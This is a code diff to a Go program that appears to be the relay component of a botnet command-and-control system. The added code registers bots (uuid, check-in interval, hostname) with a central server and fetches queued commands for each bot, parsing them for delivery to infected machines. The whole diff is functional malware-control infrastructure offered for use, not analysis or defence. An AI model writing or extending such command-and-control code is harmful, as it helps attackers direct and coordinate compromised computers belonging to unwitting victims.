@@ -3,9 +3,12 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"encoding/base64"
 	"fmt"
+	"io/ioutil"
 	"net"
+	"net/http"
 	"os"
 	"strings"
 )
@@ -97,7 +100,7 @@ func handlePayload(payload string) string {
 	case "C":
 		retval = registerBot(data)
 	case "D":
-		retval = getCommand(data)
+		retval = getCommands(data)
 	case "E":
 		retval = addResult(data, aid)
 	default:
@@ -108,17 +111,61 @@ func handlePayload(payload string) string {
 
 // take params from bot and register it in the DB
 func registerBot(payload string) string {
+	url := CORE + "/register/bot"
 	splitPayload := strings.Split(payload, "||")
 	uid := splitPayload[0]
 	intrv := splitPayload[1]
 	dlt := splitPayload[2]
 	hn := splitPayload[3]
-	return ""
+
+	cli := http.Client{}
+	prejson := `{"uuid":"` + uid + `", "interval":"` + intrv + `", "delta": "` + dlt + `", "hostname": "` + hn + `"}`
+	jsonStr := []byte(prejson)
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
+	req.Header.Set("Content-Type", "application/json")
+	resp, err := cli.Do(req)
+	if err != nil {
+		return "Error: Unable to reach server"
+	}
+	body, _ := ioutil.ReadAll(resp.Body)
+	fmt.Println("body=", string(body))
+	return string(body)
+}
+
+func parseCommands(cstr string) string {
+	retStr := ""
+	carr := strings.Split(cstr, "}, {")
+	for _, comStr := range carr {
+		comStr = strings.Replace(comStr, "[{", "", 1)
+		comStr = strings.Replace(comStr, "}]", "", 1)
+		comStr = strings.Replace(comStr, "'id': ", "", 1)
+		comStr = strings.Replace(comStr, ", 'mode': '", ":", 1)
+		comStr = strings.Replace(comStr, "', 'arguments': '", ":", 1)
+		comStr = strings.Replace(comStr, "', 'options': ''", "", 1)
+		fmt.Println(comStr)
+		retStr = retStr + comStr + "<||>"
+	}
+	retStr = strings.TrimSuffix(retStr, "<||>")
+	return retStr
 }
 
 // pull all commands from DB with associated uuid
-func getCommand(payload string) string {
-	return ""
+func getCommands(payload string) string {
+	url := CORE + "/get/command"
+	uid := payload
+	cli := http.Client{}
+	prejson := `{"uuid":"` + uid + `"}`
+	jsonStr := []byte(prejson)
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
+	req.Header.Set("Content-Type", "application/json")
+	resp, err := cli.Do(req)
+	if err != nil {
+		return "Error: Unable to reach server"
+	}
+	body, _ := ioutil.ReadAll(resp.Body)
+	fmt.Println("body=", string(body))
+	prsd := parseCommands(string(body))
+	return prsd
 }
 
 // send the action result back to the DB for feedback tracking
